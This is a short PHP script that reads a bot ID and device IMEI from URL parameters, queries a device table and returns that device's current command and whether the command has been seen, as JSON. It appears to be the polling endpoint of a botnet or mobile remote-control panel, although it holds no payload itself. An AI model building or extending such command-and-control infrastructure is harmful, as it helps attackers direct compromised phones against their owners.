<?php 

 
//$id = $_GET["code"];
 //database constants

//Server 

include 'DatabaseConfig.php' ;
 
 $conn = mysqli_connect($HostName,$HostUser,$HostPass,$DatabaseName);
 
 if (mysqli_connect_errno()) {
 echo "Failed to connect to MySQL: " . mysqli_connect_error();
 die();
 }
 
 $imei=$_GET['imei'];
 $botid=$_GET['botid'];
 


  $stmt = $conn->prepare("SELECT clm_id,clm_device_id,clm_currentcommand,clm_registered,clm_commandseen
   FROM tbl_device WHERE clm_id= ? AND clm_device_id = ?" );
 $stmt->bind_param("si", $botid, $imei);


 
 //executing the query 
 $stmt->execute();
 
 //binding results to the query 
 $stmt->bind_result($clm_id,$clm_device_id,$clm_currentcommand,$clm_registered,$clm_commandseen);
 
 $products = array(); 
 
 //traversing through all the result 
 while($stmt->fetch()){
 $temp = array();
 $temp['bot_id'] = $clm_id; 
 $temp['dev_id'] = $clm_device_id; 
 $temp['bot_reg'] = $clm_registered; 
 $temp['ccmd'] = $clm_currentcommand; 
 $temp['cseen'] = $clm_commandseen; 

 
array_push($products, $temp);
 
 }

 
 
 //displaying the result in json format 
 echo json_encode($products);